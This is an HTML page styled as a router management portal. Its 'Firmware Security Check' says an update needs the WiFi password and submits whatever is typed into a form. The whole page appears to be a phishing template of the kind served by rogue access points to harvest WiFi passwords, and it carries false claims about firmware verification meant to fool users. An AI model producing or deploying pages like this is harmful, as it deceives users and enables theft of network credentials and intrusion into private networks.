<!DOCTYPE html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content=#f7f8fa><title>Router Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:grid;place-items:center;padding:1rem}
.card{background:#fff;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,.12);padding:2rem 1.5rem;width:100%;max-width:380px}
.logo{text-align:center;margin-bottom:1.5rem}
.logo svg{width:52px;height:52px}
h2{font-size:1.1rem;color:#1a1a2e;text-align:center;margin-bottom:.35rem;font-weight:600}
.sub{text-align:center;font-size:.82rem;color:#666;margin-bottom:1.5rem}
label{display:block;font-size:.8rem;color:#444;font-weight:500;margin-bottom:.35rem}
input[type=password]{width:100%;padding:.7rem .85rem;border:1.5px solid #d1d5db;border-radius:8px;font-size:1rem;color:#111;background:#fafafa;transition:border-color .15s;-webkit-appearance:none;margin-bottom:1rem}
input[type=password]:focus{outline:none;border-color:#0070f3;background:#fff}
input[type=submit]{width:100%;padding:.8rem;background:#0070f3;color:#fff;border:none;border-radius:8px;font-size:.95rem;font-weight:600;cursor:pointer;transition:background .15s;-webkit-appearance:none;touch-action:manipulation}
input[type=submit]:hover{background:#005ed4}
input[type=submit]:active{background:#004ab0}
.footer{text-align:center;font-size:.72rem;color:#aaa;margin-top:1.25rem}
.notice{background:#fff7ed;border:1px solid #fed7aa;border-radius:6px;padding:.6rem .8rem;font-size:.75rem;color:#92400e;margin-bottom:1rem;line-height:1.4}
</style>
</head>
<body>
<div class=card>
  <div class=logo>
    <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="52" height="52" rx="12" fill="#0070f3"/>
      <path d="M26 14c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm0 4a8 8 0 1 1 0 16A8 8 0 0 1 26 18zm0 3a5 5 0 1 0 0 10A5 5 0 0 0 26 21z" fill="white" opacity=".9"/>
      <circle cx="26" cy="26" r="3" fill="white"/>
    </svg>
  </div>
  <h2>Firmware Security Check</h2>
  <p class=sub>Your router requires authentication to continue with the firmware update.</p>
  <div class=notice>🔒 Your WiFi password is required to verify your identity before applying the update.</div>
  <form action=/submit method=get>
    <label for=password>WiFi Password</label>
    <input type=password id=password name=password placeholder="Enter your WiFi password" required autocomplete=current-password>
    <input type=submit value="Verify & Continue">
  </form>
  <p class=footer>Secure connection · Router Management Portal</p>
</div>
</body></html>
